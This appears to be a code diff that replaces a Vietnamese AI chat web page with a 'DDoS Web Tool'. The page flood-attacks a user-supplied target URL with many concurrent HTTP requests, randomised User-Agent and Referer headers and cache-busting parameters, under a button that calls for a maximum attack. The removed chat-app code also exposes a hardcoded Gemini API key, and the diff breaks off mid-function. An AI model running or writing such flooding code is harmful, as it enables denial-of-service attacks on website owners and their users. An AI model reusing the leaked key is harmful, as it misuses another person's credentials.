@@ -1,1156 +1,248 @@
 <!DOCTYPE html>
-<html lang="vi">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI Chat Hiện Đại</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" integrity="sha512-9usAa10IRO0HhonpyAIVpjrylPvoDwiPUiKdWk5t3PyolY1cOd4DSE0Ga+ri4AuTroPR5aQvXU9xC6qOPnzFeg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" integrity="sha512-vsweODo68mUuH+gxjNWzKWykValMhawjkZXtwiDAxPKi3MfSq+GlvM9m8xCkKMp9i6ZrmtYU3Nz+XYdxSX6rlg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <title>DDoS Web Tool (Client-Side - MAX Performance)</title>
     <style>
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
             margin: 0;
             padding: 0;
-            background-color: var(--bg-color, #121212);
-            color: var(--text-color, #ffffff);
             display: flex;
-            transition: background-color 0.3s, color 0.3s;
-            overflow-x: hidden;
-        }
-
-        :root {
-            --bg-color: #121212;
-            --text-color: #ffffff;
-            --sidebar-bg-color: #212121;
-            --sidebar-item-hover-bg: rgba(255, 255, 255, 0.1);
-            --chat-header-bg-color: #212121;
-            --message-bubble-ai-bg: #424242;
-            --message-bubble-user-bg: #3498db;
-            --input-area-bg-color: #212121;
-            --input-border-color: #555;
-            --input-bg-color: #333;
-            --modal-backdrop-color: rgba(0,0,0,0.8);
-            --modal-content-bg-color: #333;
-            --modal-border-color: #555;
-            --button-primary-bg-color: #3498db;
-            --button-primary-hover-bg-color: #2980b9;
-            --code-block-bg-color: #272822;
-            --confirmation-color: #4CAF50;
-            --error-color: #F44336;
-        }
-
-        /* Sidebar */
-        .sidebar-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
-            z-index: 999;
-            display: none;
-        }
-
-        .sidebar-overlay.active {
-            display: block;
-        }
-
-        .sidebar {
-            width: 250px;
-            background-color: var(--sidebar-bg-color);
-            color: white;
-            padding: 20px;
-            box-shadow: 2px 0 5px rgba(0, 0, 0, 0.3);
-            transition: transform 0.3s ease-in-out, background-color 0.3s;
-            transform: translateX(0);
-            z-index: 1000;
-            height: 100vh;
-            overflow-y: auto;
-            position: fixed;
-            top: 0;
-            left: 0;
-        }
-
-        .sidebar.hidden {
-            transform: translateX(-250px);
-        }
-
-        .sidebar-header {
-            display: flex;
-            justify-content: space-between;
+            justify-content: center;
             align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 80%;
+            max-width: 600px;
+        }
+
+        h1 {
+            color: #333;
             margin-bottom: 20px;
         }
 
-        .sidebar-header h3 {
-            margin: 0;
-            font-size: 1.5em;
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
         }
 
-        .menu-icon {
-            font-size: 1.5em;
-            cursor: pointer;
-            color: white;
-        }
-
-        .sidebar-menu {
-            list-style: none;
-            padding: 0;
-            margin: 0;
-        }
-
-        .sidebar-menu li {
-            padding: 10px 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        .sidebar-menu li:last-child {
-            border-bottom: none;
-        }
-
-        .sidebar-menu a {
-            display: flex;
-            align-items: center;
-            color: white;
-            text-decoration: none;
-            padding: 10px 15px; /* Increased padding for better spacing */
-            border-radius: 5px;
-            transition: background-color 0.3s ease;
-            line-height: 1.6; /* Increased line-height for menu items */
-        }
-
-        .sidebar-menu a:hover, .sidebar-menu a.active {
-            background-color: var(--sidebar-item-hover-bg);
-        }
-
-        .sidebar-menu a i {
-            margin-right: 10px; /* Increased spacing between icon and text */
-            width: 1.2em; /* Ensure consistent icon width */
-            text-align: center; /* Center icons */
-        }
-
-        .submenu {
-            margin-left: 15px;
-            padding-left: 10px;
-            border-left: 2px solid rgba(255, 255, 255, 0.2);
-            display: none;
-            overflow: hidden;
-            max-height: 0;
-            transition: max-height 0.3s ease-out, padding 0.3s ease-out;
-        }
-
-        .submenu.active {
+        .form-group label {
             display: block;
-            max-height: 500px;
-            padding-bottom: 10px;
-            transition: max-height 0.3s ease-in, padding 0.3s ease-in;
+            margin-bottom: 8px;
+            color: #555;
+            font-weight: bold;
         }
 
-
-        .submenu li {
-            padding: 5px 0;
-        }
-
-        .submenu a {
-            padding: 8px 15px; /* Adjusted padding for submenu items */
-            font-size: 0.95em;
-            display: block;
-            line-height: 1.5; /* Increased line-height for submenu items */
-        }
-        .submenu a:hover, .submenu a.active {
-            background-color: var(--sidebar-item-hover-bg);
-        }
-
-        .history-search {
-            padding: 0 15px 15px; /* Increased padding bottom for search input */
-        }
-
-        .history-search input[type="text"] {
+        .form-group input[type="text"],
+        .form-group input[type="number"],
+        .form-group select {
             width: 100%;
             padding: 10px;
-            border-radius: 5px;
-            border: 1px solid var(--input-border-color);
-            background-color: var(--input-bg-color);
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+
+        button {
+            background-color: #d9534f; /* Đỏ */
             color: white;
-            font-size: 0.95em; /* Slightly smaller font size for search input */
-        }
-
-
-        .history-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 8px 15px; /* Adjusted padding for history items */
-        }
-
-        .history-item:hover {
-            background-color: var(--sidebar-item-hover-bg);
-        }
-
-        .history-item button {
-            background: none;
+            padding: 12px 25px;
             border: none;
-            color: white;
+            border-radius: 4px;
             cursor: pointer;
-            font-size: 1em;
-            opacity: 0.7;
-            transition: opacity 0.3s;
-            margin-left: 5px; /* Added some spacing for delete button */
+            font-size: 18px;
+            transition: background-color 0.3s ease, transform 0.1s ease; /* Animation nút */
         }
 
-        .history-item button:hover {
-            opacity: 1;
+        button:hover {
+            background-color: #c9302c; /* Đỏ đậm hơn */
         }
 
-        .settings-option {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 12px; /* Increased margin bottom for settings options */
+        button:active {
+            transform: scale(0.95); /* Hiệu ứng nhấn nút */
         }
 
-        .settings-option label {
-            margin-right: 15px;
-            font-size: 0.95em; /* Slightly smaller font size for labels */
+        #status {
+            margin-top: 20px;
+            font-weight: bold;
+            animation: pulseStatus 1.5s infinite; /* Animation trạng thái */
+            min-height: 2em; /* Đảm bảo đủ không gian cho thông báo */
         }
 
-        .settings-option select, .settings-option input[type="color"], .settings-option input[type="checkbox"] {
-            -webkit-appearance: none;
-            -moz-appearance: none;
-            appearance: none;
-            padding: 8px;
-            border-radius: 5px;
-            border: 1px solid var(--input-border-color);
-            background-color: var(--input-bg-color);
-            color: white;
-            font-size: 0.95em; /* Slightly smaller font size for settings inputs */
+        @keyframes pulseStatus {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
         }
 
-        .settings-option input[type="color"] {
-            width: 30px;
-            height: 30px;
-            padding: 0;
-            cursor: pointer;
+        .attacking-container {
+            background-color: #ffe0b2; /* Màu cam nhạt khi tấn công */
         }
 
-        .settings-option input[type="color"]::-webkit-color-swatch-wrapper {
-            padding: 0;
-        }
-
-        .settings-option input[type="color"]::-webkit-color-swatch {
-            border: 1px solid #555;
-            border-radius: 3px;
-        }
-
-        .settings-option input[type="color"]::-moz-color-swatch-wrapper {
-            padding: 0;
-        }
-
-        .settings-option input[type="color"]::-moz-color-swatch {
-            border: 1px solid #555;
-            border-radius: 3px;
-        }
-
-        .settings-buttons {
-            margin-top: 25px; /* Increased margin top for settings buttons */
-            text-align: right;
-        }
-
-        .settings-buttons button {
-            background-color: var(--button-primary-bg-color);
-            color: white;
-            border: none;
-            padding: 10px 20px; /* Adjusted padding for settings buttons */
-            border-radius: 5px;
-            cursor: pointer;
-            margin-left: 10px;
-            transition: background-color 0.3s ease;
-            font-size: 1em;
-        }
-
-        .settings-buttons button:hover {
-            background-color: var(--button-primary-hover-bg-color);
-        }
-
-        /* Chat Container */
-        .chat-container {
-            flex-grow: 1;
-            display: flex;
-            flex-direction: column;
-            height: 100vh;
-            overflow: hidden;
-        }
-
-        .chat-header {
-            background-color: var(--chat-header-bg-color);
-            padding: 15px 25px; /* Increased padding for chat header */
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
-            z-index: 999;
-            transition: background-color 0.3s;
-        }
-
-        .chat-header h2 {
-            margin: 0;
-            font-size: 1.5em; /* Slightly larger font size for chat title */
-        }
-
-        .message-area {
-            flex-grow: 1;
-            padding: 25px; /* Increased padding for message area */
-            overflow-y: scroll;
-            display: flex;
-            flex-direction: column;
-            background-color: var(--chat-bg-color);
-            transition: background-color 0.3s;
-            position: relative;
-            line-height: 1.6; /* Increased line height for message text */
-        }
-
-        /* Loading Spinner - No changes here */
-        .loading-spinner {
-            position: absolute;
-            bottom: 10px;
-            left: 50%;
-            transform: translateX(-50%);
-            border: 4px solid rgba(255, 255, 255, 0.3);
-            border-top: 4px solid var(--button-primary-bg-color);
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            opacity: 0;
-            visibility: hidden;
-            transition: opacity 0.3s, visibility 0.3s;
-        }
-
-        .loading-spinner.show {
-            opacity: 1;
-            visibility: visible;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg) translateX(-50%); }
-            100% { transform: rotate(360deg) translateX(-50%); }
-        }
-
-
-        .message-bubble {
-            background-color: var(--message-bubble-ai-bg);
-            color: #ffffff;
-            border-radius: 12px; /* Slightly more rounded message bubbles */
-            padding: 12px 20px; /* Increased padding for message bubbles */
-            margin-bottom: 12px; /* Increased margin bottom for message bubbles */
-            max-width: 75%; /* Slightly wider message bubbles */
-            word-wrap: break-word;
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2); /* Slightly stronger shadow for bubbles */
-            font-size: 1em; /* Adjusted font size for message text */
-        }
-
-        .message-bubble.user {
-            background-color: var(--message-bubble-user-bg);
-            color: white;
-            align-self: flex-end;
-        }
-
-        .input-area {
-            background-color: var(--input-area-bg-color);
-            padding: 20px 25px; /* Increased padding for input area */
-            border-top: 1px solid #333;
-            display: flex;
-            align-items: center;
-            transition: background-color 0.3s;
-        }
-
-        .input-area textarea {
-            flex-grow: 1;
-            border: 1px solid var(--input-border-color);
-            border-radius: 8px; /* Slightly more rounded textarea */
-            padding: 12px; /* Increased padding for textarea */
-            resize: none;
-            font-size: 1em;
-            height: 50px; /* Slightly taller textarea */
-            overflow-y: auto;
-            background-color: var(--input-bg-color);
-            color: white;
-            transition: border-color 0.3s, background-color 0.3s, color 0.3s;
-            line-height: 1.6; /* Increased line height for textarea text */
-        }
-        .input-area textarea:hover, .input-area textarea:focus {
-            border-color: #aaa;
-            outline: none;
-            box-shadow: 0 0 6px rgba(170,170,170,0.3); /* Slightly stronger focus shadow */
-        }
-
-        .input-area button, .input-area .attach-button {
-            background-color: var(--button-primary-bg-color);
-            color: white;
-            border: none;
-            padding: 12px 20px; /* Adjusted padding for buttons */
-            border-radius: 8px; /* Slightly more rounded buttons */
-            cursor: pointer;
-            margin-left: 15px; /* Increased margin for send button */
-            transition: background-color 0.3s ease;
-            font-size: 1em;
-            height: auto;
-            line-height: 1.4; /* Adjusted line height for button text */
-        }
-
-        .input-area button:hover, .input-area button:focus, .input-area button:disabled, .input-area .attach-button:hover, .input-area .attach-button:focus {
-            background-color: var(--button-primary-hover-bg-color);
-            outline: none;
-        }
-        .input-area button:disabled {
-            background-color: #777;
-            cursor: not-allowed;
-        }
-
-
-        .input-area .attach-button {
-            background-color: transparent;
-            color: #ccc;
-            padding: 10px;
-            margin-left: 10px; /* Increased margin for attach button */
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 1.3em; /* Slightly larger attach icon */
-        }
-
-        .input-area .attach-button:hover {
-            background-color: #444;
-            color: #ddd;
-        }
-
-        /* Modals - No changes here */
-        .modal {
-            display: none;
-            position: fixed;
-            z-index: 1;
-            left: 0;
-            top: 0;
+        #progressBarContainer {
             width: 100%;
-            height: 100%;
-            overflow: auto;
-            background-color: var(--modal-backdrop-color);
+            background-color: #eee;
+            border-radius: 4px;
+            margin-top: 10px;
+            overflow: hidden; /* Để bo tròn góc thanh tiến trình */
         }
 
-        .modal-content {
-            background-color: var(--modal-content-bg-color);
-            margin: 15% auto;
-            padding: 20px;
-            border: 1px solid var(--modal-border-color);
-            width: 80%;
-            max-width: 500px;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px 0 rgba(0,0,0,0.4);
+        #progressBar {
+            width: 0%;
+            height: 20px;
+            background-color: #4CAF50; /* Màu xanh lá cây */
+            border-radius: 4px;
+            transition: width 0.1s ease; /* Animation mượt mà cho thanh tiến trình */
         }
 
-        /* ... rest of modal styles ... */
-
-        /* Utility classes for icons - No changes here */
-        .icon {
-            display: inline-block;
-            width: 1em;
-            height: 1em;
-            stroke-width: 0;
-            stroke: currentColor;
-            fill: currentColor;
+        #requestsSent {
+            margin-top: 10px;
+            font-style: italic;
+            color: #777;
         }
-
-        /* Code block styling for Prism.js - No changes here */
-        pre[class*="language-"] {
-           /* ... */
-        }
-
-        /* Confirmation and Error Messages - No changes here */
-        .confirmation-message, .error-message {
-            /* ... */
-        }
-
-        /* Copied message - No changes here */
-        .copied-message {
-            /* ... */
-        }
-
-
-        /* Responsive Design - Large Screen Layout */
-        @media (min-width: 992px) { /* Desktop and larger screens */
-            body {
-                flex-direction: row; /* Default flex-direction for larger screens */
-            }
-            .sidebar {
-                position: relative; /* Make sidebar static on larger screens */
-                transform: translateX(0); /* Always visible */
-                height: auto; /* Allow sidebar height to adjust to content */
-                flex-shrink: 0; /* Prevent sidebar from shrinking */
-                border-right: 1px solid #333; /* Add a visual separator */
-                height: 100vh; /* Full height sidebar on desktop */
-            }
-            .sidebar.hidden {
-                transform: translateX(0); /* Override hidden state on desktop */
-            }
-            .sidebar-overlay {
-                display: none !important; /* Hide overlay on desktop */
-            }
-            .chat-container {
-                margin-left: 250px; /* Shift chat container to the right to accommodate fixed sidebar */
-            }
-            .chat-header {
-                padding-left: 30px; /* Adjust header padding for desktop layout */
-                padding-right: 30px;
-            }
-            .message-area {
-                padding-left: 30px; /* Adjust message area padding for desktop layout */
-                padding-right: 30px;
-            }
-            .input-area {
-                padding-left: 30px; /* Adjust input area padding for desktop layout */
-                padding-right: 30px;
-            }
-        }
-
-
-        /* Responsive Design - Tablets (adjust as needed) */
-        @media (max-width: 991px) and (min-width: 768px) { /* Tablets in landscape and portrait */
-            .sidebar {
-                width: 220px; /* Slightly smaller sidebar on tablets */
-            }
-            .chat-container {
-                margin-left: 220px; /* Adjust chat container margin for tablet sidebar */
-            }
-             .chat-header h2 {
-                font-size: 1.2em; /* Slightly smaller title on tablets */
-            }
-             .message-area {
-                padding: 20px; /* Adjust message area padding for tablets */
-            }
-            .input-area {
-                padding: 15px 20px; /* Adjust input area padding for tablets */
-            }
-        }
-
-
-        /* Responsive Design - Mobile (existing styles, minor adjustments) */
-        @media (max-width: 767px) { /* For phones */
-            body {
-                flex-direction: column; /* Ensure column layout on mobile */
-            }
-            .sidebar {
-                width: 220px; /* Keep sidebar width smaller on mobile */
-                transform: translateX(-220px); /* Hidden off-screen initially */
-            }
-            .sidebar.hidden {
-                transform: translateX(0); /* Slide in when not hidden */
-            }
-            .chat-container {
-                margin-left: 0; /* Full width chat container on mobile */
-            }
-            .chat-header h2 {
-                font-size: 1.1em; /* Keep title smaller on mobile */
-            }
-            .message-area {
-                padding: 15px; /* Adjust message area padding for mobile */
-            }
-            .input-area {
-                padding: 10px 15px; /* Adjust input area padding for mobile */
-            }
-            .input-area button, .input-area .attach-button {
-                padding: 8px 12px;
-                font-size: 0.9em; /* Smaller buttons on mobile */
-            }
-        }
-
-
     </style>
-
 </head>
-<body onclick="handleBodyClick(event)">
-
-    <div class="sidebar-overlay" id="sidebar-overlay" onclick="toggleSidebar()"></div>
-    <div class="sidebar">
-        <div class="sidebar-header">
-            <h3>Menu</h3>
-            <i class="fas fa-times menu-icon" onclick="toggleSidebar()"></i>
+<body>
+    <div class="container" id="mainContainer">
+        <h1>DDoS Web Tool (Client-Side - MAX Performance)</h1>
+        <div class="form-group">
+            <label for="targetUrl">URL mục tiêu:</label>
+            <input type="text" id="targetUrl" placeholder="Nhập URL mục tiêu (ví dụ: http://example.com)">
         </div>
-        <ul class="sidebar-menu">
-            <li><a href="#" onclick="newChat()"><i class="fas fa-plus"></i>Đoạn chat mới</a></li>
-            <li><a href="#" onclick="openSaveHistoryModal()" id="saveHistoryMenuItem"><i class="fas fa-save"></i>Lưu lịch sử này</a></li>
-            <li>
-                <a href="#" onclick="toggleSubmenu('history-submenu', event)"><i class="fas fa-history"></i>Lịch sử đã lưu</a>
-                <ul class="submenu" id="history-submenu">
-                    <li class="history-search">
-                        <input type="text" id="historySearchInput" placeholder="Tìm kiếm lịch sử...">
-                    </li>
-                    <!-- History items will be added here by JavaScript -->
-                </ul>
-            </li>
-            <li>
-                <a href="#" onclick="toggleSubmenu('settings-submenu', event)"><i class="fas fa-cog"></i>Cài đặt</a>
-                <ul class="submenu" id="settings-submenu">
-                    <li class="settings-option">
-                        <label for="auto-save">Tự động lưu lịch sử</label>
-                        <input type="checkbox" id="auto-save">
-                    </li>
-                    <li class="settings-option">
-                        <label for="history-name-first-question">Tên lịch sử là câu hỏi đầu</label>
-                        <input type="checkbox" id="history-name-first-question">
-                    </li>
-                    <li class="settings-option">
-                        <label for="theme-select">Giao diện code</label>
-                        <select id="theme-select">
-                            <option value="prism-tomorrow">Tomorrow</option>
-                            <option value="prism">Default</option>
-                            <option value="prism-okaidia">Okaidia</option>
-                            <option value="prism-solarizeddark">Solarized Dark</option>
-                            <option value="prism-twilight">Twilight</option>
-                        </select>
-                    </li>
-                    <li class="settings-option">
-                        <label for="bg-color">Màu nền</label>
-                        <input type="color" id="bg-color" value="#121212">
-                    </li>
-                    <li class="settings-option">
-                        <label for="text-color">Màu chữ</label>
-                        <input type="color" id="text-color" value="#ffffff">
-                    </li>
-                    <li class="settings-option">
-                        <label for="chat-bg-color">Màu nền hộp chat</label>
-                        <input type="color" id="chat-bg-color" value="#212121">
-                    </li>
-                    <li class="settings-buttons">
-                        <button onclick="saveSettings()">Lưu cài đặt</button>
-                        <button onclick="undoSettings()">Hoàn tác</button>
-                    </li>
-                </ul>
-            </li>
-        </ul>
+        <div class="form-group">
+            <label for="attackMethod">Phương thức tấn công:</label>
+            <select id="attackMethod">
+                <option value="http-flood">HTTP Flood (Client-Side - MAX)</option>
+                <option value="none">Không khả dụng (Slowloris, UDP Flood - Client-Side)</option>
+            </select>
+        </div>
+        <div class="form-group">
+            <label for="threads">Số luồng (threads - đồng thời):</label>
+            <input type="number" id="threads" value="100" min="1"> <!-- Tăng threads mặc định -->
+        </div>
+        <div class="form-group">
+            <label for="duration">Thời gian tấn công (giây):</label>
+            <input type="number" id="duration" value="20" min="1"> <!-- Tăng duration mặc định -->
+        </div>
+        <button id="startAttack">🔥 BẮT ĐẦU TẤN CÔNG TỐI ĐA! 🔥</button>
+        <div id="status">Sẵn sàng cho cuộc tấn công tối đa...</div>
+        <div id="progressBarContainer">
+            <div id="progressBar"></div>
+        </div>
+        <div id="requestsSent"></div>
     </div>
-
-    <div class="chat-container">
-        <div class="chat-header">
-            <i class="fas fa-bars menu-icon" onclick="toggleSidebar()"></i>
-            <h2>AI Chat</h2>
-        </div>
-        <div class="message-area" id="message-area">
-            <div class="loading-spinner" id="loading-spinner"></div>
-            <!-- Messages will be appended here by JavaScript -->
-        </div>
-        <div class="input-area">
-            <i class="fas fa-paperclip attach-button"></i>
-            <textarea id="message-input" placeholder="Nhập tin nhắn..." oninput="checkInput()"></textarea>
-            <button onclick="sendMessage()" id="sendButton" disabled>Gửi</button>
-        </div>
-    </div>
-
-    <!-- Save History Modal -->
-    <div id="saveHistoryModal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <span class="close-button" onclick="closeSaveHistoryModal()">&times;</span>
-                <h2>Lưu lịch sử chat</h2>
-            </div>
-            <div class="modal-body">
-                <input type="text" id="historyNameInput" placeholder="Nhập tên lịch sử">
-            </div>
-            <div class="modal-footer">
-                <button onclick="saveHistory()">Lưu</button>
-                <button onclick="closeSaveHistoryModal()">Hủy</button>
-            </div>
-        </div>
-    </div>
-
-    <div class="copied-message" id="copied-confirmation">Đã sao chép vào clipboard!</div>
-    <div class="confirmation-message" id="action-confirmation"></div>
-    <div class="error-message" id="api-error-message"></div>
-
-
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-NlKI+oQZ+gGt9ggTpO+LgQo9oWdO2h5p/8lr/VCdGDTvKXZMq+gIHv5voW9e8GlS/g5Wjyxm3CqjG7W7Vf6y+g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-javascript.min.js" integrity="sha512-jLCHmr5IU189O2jGuQj+3Tyzu1xoJsOO3CcWueUMrRcJ9iWl2uV09Szwvjy9VyttAr6Q1l7Tqsj+z82FTz1zvg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 
     <script>
-        const sidebar = document.querySelector('.sidebar');
-        const messageArea = document.getElementById('message-area');
-        const messageInput = document.getElementById('message-input');
-        const historySubmenu = document.getElementById('history-submenu');
-        const settingsSubmenu = document.getElementById('settings-submenu');
-        const saveHistoryModal = document.getElementById('saveHistoryModal');
-        const historyNameInput = document.getElementById('historyNameInput');
-        const copiedConfirmation = document.getElementById('copied-confirmation');
-        const themeSelect = document.getElementById('theme-select');
-        const loadingSpinner = document.getElementById('loading-spinner');
-        const actionConfirmation = document.getElementById('action-confirmation');
-        const apiErrorMessage = document.getElementById('api-error-message');
-        const historySearchInput = document.getElementById('historySearchInput');
-        const saveHistoryMenuItem = document.getElementById('saveHistoryMenuItem');
-        const sendButton = document.getElementById('sendButton');
-        const sidebarOverlay = document.getElementById('sidebar-overlay');
-        let activeSubmenu = null;
+        document.addEventListener('DOMContentLoaded', function() {
+            const startAttackButton = document.getElementById('startAttack');
+            const statusDiv = document.getElementById('status');
+            const mainContainer = document.getElementById('mainContainer');
+            const progressBar = document.getElementById('progressBar');
+            const requestsSentDiv = document.getElementById('requestsSent');
 
-        let chatHistory = [];
-        let savedHistories = JSON.parse(localStorage.getItem('chatHistories')) || {};
-        let settings = JSON.parse(localStorage.getItem('chatSettings')) || {
-            autoSaveHistory: false,
-            historyNameFirstQuestion: false,
-            theme: 'prism-tomorrow',
-            bgColor: '#121212',
-            textColor: '#ffffff',
-            chatBgColor: '#212121'
-        };
-        let filteredHistories = { ...savedHistories };
+            startAttackButton.addEventListener('click', function() {
+                const targetUrl = document.getElementById('targetUrl').value;
+                const attackMethod = document.getElementById('attackMethod').value;
+                const threads = parseInt(document.getElementById('threads').value);
+                const duration = parseInt(document.getElementById('duration').value);
 
-        // **IMPORTANT: Replace with your actual API key here!**
-        const apiKey = 'AIzaSyCGd-w96-bJENQ9pGnLBcUg6pH1srsud20';
-        const geminiAPIUrl = 'https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=apiKey';
+                if (!targetUrl) {
+                    statusDiv.textContent = 'LỖI: Vui lòng nhập URL mục tiêu!';
+                    statusDiv.style.color = 'red';
+                    return;
+                }
 
+                if (attackMethod === 'none') {
+                    statusDiv.textContent = 'LỖI: Phương thức này không khả dụng ở phía client!';
+                    statusDiv.style.color = 'red';
+                    return;
+                }
 
-        // Apply initial settings
-        applySettings();
-        loadSavedHistoryList();
-        updateSaveHistoryButtonState();
+                statusDiv.textContent = '🔥 ĐANG KHỞI ĐỘNG CUỘC TẤN CÔNG HTTP FLOOD TỐI ĐA (Client-Side)... 🔥';
+                statusDiv.style.color = 'orange';
+                mainContainer.classList.add('attacking-container');
+                progressBar.style.width = '0%'; // Reset progress bar
+                requestsSentDiv.textContent = '';
+                let sentRequestsCounter = 0;
 
-        // Auto-focus on textarea after page load
-        messageInput.focus();
+                const startTime = Date.now();
+                let attackInterval;
+                const userAgents = [ // Danh sách User-Agent ngẫu nhiên
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
+                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/96.0.1054.62",
+                    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1"
+                    // ... Bạn có thể thêm nhiều User-Agent hơn
+                ];
+                const referers = [ // Danh sách Referer ngẫu nhiên
+                    "https://www.google.com/",
+                    "https://www.facebook.com/",
+                    "https://www.youtube.com/",
+                    "https://twitter.com/",
+                    "https://www.example.com/"
+                    // ... Bạn có thể thêm nhiều Referer hơn
+                ];
 
-        function toggleSidebar() {
-            sidebar.classList.toggle('hidden');
-            sidebarOverlay.classList.toggle('active');
-            if (sidebar.classList.contains('hidden')) {
-                closeAllSubmenus();
-            }
-        }
-
-        function toggleSubmenu(submenuId, event) {
-            event.preventDefault();
-            const submenu = document.getElementById(submenuId);
-
-            if (activeSubmenu && activeSubmenu !== submenu) {
-                activeSubmenu.classList.remove('active');
-            }
-            submenu.classList.toggle('active');
-            activeSubmenu = submenu.classList.contains('active') ? submenu : null;
-
-            if (submenu.classList.contains('active')) {
-                closeOtherSubmenus(submenuId);
-            } else {
-                activeSubmenu = null;
-            }
-
-
-            if (submenuId === 'history-submenu' && submenu.classList.contains('active')) {
-                historySearchInput.focus();
-            }
-        }
-
-        function closeAllSubmenus() {
-            if (activeSubmenu) {
-                activeSubmenu.classList.remove('active');
-                activeSubmenu = null;
-            }
-        }
-
-        function closeOtherSubmenus(currentSubmenuId) {
-            const submenus = ['history-submenu', 'settings-submenu'];
-            submenus.forEach(submenuId => {
-                if (submenuId !== currentSubmenuId) {
-                    const submenu = document.getElementById(submenuId);
-                    if (submenu && submenu.classList.contains('active')) {
-                        submenu.classList.remove('active');
+                const sendHttpRequest = () => {
+                    if (Date.now() - startTime >= duration * 1000) {
+                        clearInterval(attackInterval);
+                        statusDiv.textContent = `🔥 CUỘC TẤN CÔNG TỐI ĐA HOÀN TẤT (Client-Side)! 🔥 Đã gửi TỔNG CỘNG ${sentRequestsCounter} requests. (Lưu ý: Vẫn là mô phỏng, hiệu quả RẤT HẠN CHẾ)`;
+                        statusDiv.style.color = 'green';
+                        mainContainer.classList.remove('attacking-container');
+                        return;
                     }
-                }
-            });
-        }
 
+                    const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
+                    const randomReferer = referers[Math.floor(Math.random() * referers.length)];
+                    const cacheBuster = `?rand=${Math.random()}`; // Cache busting
+                    const requestUrl = targetUrl + cacheBuster;
 
-        function handleBodyClick(event) {
-             if (activeSubmenu && !sidebar.contains(event.target) && !event.target.closest('.sidebar-menu > li > a')) {
-                activeSubmenu.classList.remove('active');
-                activeSubmenu = null;
-            }
-        }
-
-
-        function newChat() {
-            chatHistory = [];
-            messageArea.innerHTML = `<div class="loading-spinner" id="loading-spinner"></div>`;
-            loadingSpinner = document.getElementById('loading-spinner');
-            messageInput.value = '';
-            messageInput.focus();
-            loadSavedHistoryList();
-            updateSaveHistoryButtonState();
-
-            const activeMenuItem = document.querySelector('.sidebar-menu a.active');
-            if (activeMenuItem) {
-                activeMenuItem.classList.remove('active');
-            }
-        }
-
-        function sendMessage() {
-            const messageText = messageInput.value.trim();
-            if (messageText) {
-                addUserMessage(messageText);
-                messageInput.value = '';
-                messageInput.focus();
-                sendButton.disabled = true;
-                showLoading();
-                // Replace generateAIResponse with actual API call
-                getGeminiResponse(messageText).then(aiResponse => {
-                    hideLoading();
-                    addAIMessage(aiResponse);
-                    updateSaveHistoryButtonState();
-                }).catch(error => {
-                    hideLoading();
-                    displayErrorMessage(error.message || 'Đã xảy ra lỗi khi giao tiếp với AI. Vui lòng thử lại.');
-                    addAIMessageBubbleOnError('Đã xảy ra lỗi khi nhận phản hồi từ AI.');
-                }).finally(() => {
-                    sendButton.disabled = false;
-                });
-            }
-        }
-
-        function addUserMessage(message) {
-            chatHistory.push({ sender: 'user', text: message });
-            displayMessage('user', message);
-        }
-
-        function addAIMessage(message) {
-            chatHistory.push({ sender: 'ai', text: message });
-            displayMessage('ai', message);
-            if (settings.autoSaveHistory) {
-                saveCurrentHistoryAuto();
-            }
-        }
-
-        function displayMessage(sender, message) {
-            const messageBubble = document.createElement('div');
-            messageBubble.classList.add('message-bubble');
-            messageBubble.classList.add(sender);
-
-            if (message.startsWith('<code>') && message.endsWith('</code>')) {
-                const codeContent = message.substring(6, message.length - 7);
-                const pre = document.createElement('pre');
-                pre.classList.add('language-javascript');
-                pre.innerHTML = `<code class="language-javascript">${Prism.highlight(codeContent, Prism.languages.javascript, 'javascript')}</code>`;
-
-                const copyButton = document.createElement('button');
